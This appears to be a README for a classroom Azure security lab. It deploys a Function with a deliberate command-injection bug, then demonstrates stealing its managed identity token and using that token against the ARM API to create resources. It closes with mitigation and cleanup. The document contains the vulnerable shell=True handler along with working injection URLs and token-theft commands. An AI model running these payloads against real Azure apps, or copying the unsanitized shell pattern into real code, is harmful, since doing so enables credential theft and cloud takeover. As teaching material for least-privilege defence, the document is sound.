# Azure Function — Over-Privileged Managed Identity Abuse

Live classroom demo: attacker exploits a command-injection bug in an Azure
Function's HTTP endpoint (app vulnerability → code execution), then abuses
the Function's **system-assigned managed identity** to act on Azure
resources — no Azure password, no `az login`, ever touched.

```
Application Vulnerability  →  Function Compromised  →  Managed Identity  →  Contributor  →  Azure Resources
```

The problem is not that the Function *has* a managed identity — every
serverless workload should. The problem is **what that identity was allowed
to do**. Same principle as over-permissive Kubernetes ServiceAccounts: give
workloads only the permissions they actually need.

## Environment (deployed and tested 2026-09-18)

| Resource | Value |
|---|---|
| Subscription | `QaVerify SetupCheck - Sub` (`9d8d5a47-4453-42f7-840f-648c01ed5308`) |
| Resource group | `rg-func-identity-abuse-lab` (region `eastus2`) |
| Function App | `func-vuln-abuse-lab-10935` (Linux, Python 3.11, Consumption plan) |
| Managed identity | System-assigned, principal id `689f7161-08c9-485b-8cfb-dfe895a9c50f` |
| Role granted to identity | **Contributor** on `rg-func-identity-abuse-lab` (scoped to its own RG — over-privileged relative to what an HTTP endpoint needs, but not tenant-wide, so the blast radius stays contained for a safe class demo) |
| Vulnerable endpoint | `GET /api/check?url=<value>` — shells out to `curl -s -m 5 <value>` with no sanitization |

## The vulnerability

`function_app.py`:

```python
@app.route(route="check", methods=["GET"])
def check(req: func.HttpRequest) -> func.HttpResponse:
    url = req.params.get("url", "https://example.com")
    result = subprocess.run(
        f"curl -s -m 5 {url}", shell=True, capture_output=True, text=True, timeout=15
    )
    return func.HttpResponse(result.stdout + result.stderr)
```

A classic "is this URL reachable?" diagnostics endpoint that shells out with
`shell=True` and unsanitized input — command injection via `;`, `|`, `` ` ``,
`$()`.

## Deploy

```bash
RG=rg-func-identity-abuse-lab
LOC=eastus2
STORAGE=stfuncabuselab$RANDOM
FUNCAPP=func-vuln-abuse-lab-$RANDOM

az group create -n $RG -l $LOC
az storage account create -n $STORAGE -g $RG -l $LOC --sku Standard_LRS
az functionapp create -g $RG --consumption-plan-location $LOC \
  --runtime python --runtime-version 3.11 --functions-version 4 \
  --name $FUNCAPP --storage-account $STORAGE --os-type Linux

az functionapp config appsettings set -g $RG -n $FUNCAPP \
  --settings AzureWebJobsFeatureFlags=EnableWorkerIndexing SCM_DO_BUILD_DURING_DEPLOYMENT=true

zip -r /tmp/identity-abuse-demo.zip . -x "*.git*"
az functionapp deployment source config-zip -g $RG -n $FUNCAPP --src /tmp/identity-abuse-demo.zip

# Give it an over-scoped identity — this is the misconfiguration being demoed
PRINCIPAL_ID=$(az functionapp identity assign -g $RG -n $FUNCAPP --query principalId -o tsv)
SUB_ID=$(az account show --query id -o tsv)
az role assignment create --assignee-object-id $PRINCIPAL_ID --assignee-principal-type ServicePrincipal \
  --role Contributor --scope /subscriptions/$SUB_ID/resourceGroups/$RG
```

## How to demo in class

Narrative: "This Function doesn't need a password stolen — if an attacker
finds a code-execution bug in the app itself (SSRF, command injection, deserialization,
whatever), they inherit whatever the app's managed identity can do. Here, that's
Contributor on a whole resource group."

1. Show the endpoint works normally:

```bash
curl "https://$FUNCAPP.azurewebsites.net/api/check?url=https://example.com"
```

2. Prove command injection — remote code execution with zero credentials:

```bash
curl "https://$FUNCAPP.azurewebsites.net/api/check?url=127.0.0.1;id"
```

Result: `uid=1000(app) gid=1000(app) groups=1000(app)` — arbitrary shell
commands running inside the Function's container.

3. Steal the managed identity token. **Important**: Azure Functions/App
   Service does *not* expose the VM-style `169.254.169.254` IMDS endpoint —
   it uses a local identity endpoint via the `IDENTITY_ENDPOINT` /
   `IDENTITY_HEADER` environment variables instead. Trigger it through the
   same injection point:

```bash
curl "https://$FUNCAPP.azurewebsites.net/api/check?url=127.0.0.1;curl%20-s%20-H%20%22X-IDENTITY-HEADER:%20%24IDENTITY_HEADER%22%20%22%24IDENTITY_ENDPOINT%3Fresource%3Dhttps%3A%2F%2Fmanagement.azure.com%2F%26api-version%3D2019-08-01%22"
```

This returns a real OAuth bearer token for the Function's managed identity,
valid ~24h — extract `access_token` from the JSON.

4. Use the stolen token to prove **write** access (this is the part that
   distinguishes it from a Reader-only identity) — create a throwaway
   resource in the RG directly via the ARM API, using only the token:

```bash
TOKEN="<access_token from step 3>"
SUB_ID=9d8d5a47-4453-42f7-840f-648c01ed5308
RG=rg-func-identity-abuse-lab

curl -X PUT \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/attackerproof$RANDOM?api-version=2023-01-01" \
  -d '{"location":"eastus2","sku":{"name":"Standard_LRS"},"kind":"StorageV2"}'
```

Point out: a **Reader**-scoped identity (see the sibling
[`imds-token-theft-demo`](../../CyberstepsAzure/imds-token-theft-demo) in the
main repo) can only list resources with a stolen token. **Contributor** lets
the attacker create, modify, or delete them — this is the actual difference
that "least privilege" buys you.

## Mitigation talking points

- **Fix the app vulnerability first** — never build shell commands from
  unsanitized input; use `subprocess.run([...])` with an argument list, no
  `shell=True`.
- **Scope managed identities to the minimum role and minimum resource** —
  this Function doesn't need Contributor on anything; if it needs to write
  to one specific storage account, grant `Storage Blob Data Contributor` on
  that one resource, not Contributor on the RG.
- **Same principle as Kubernetes ServiceAccounts**: give workloads only the
  permissions they actually need. The identity itself isn't the problem —
  what it's allowed to do is.
- **Detection**: Defender for Cloud (paid tier) flags anomalous managed
  identity token usage; Free tier (used in these labs) does not.

## Cleanup

```bash
az group delete -n rg-func-identity-abuse-lab --yes --no-wait
```
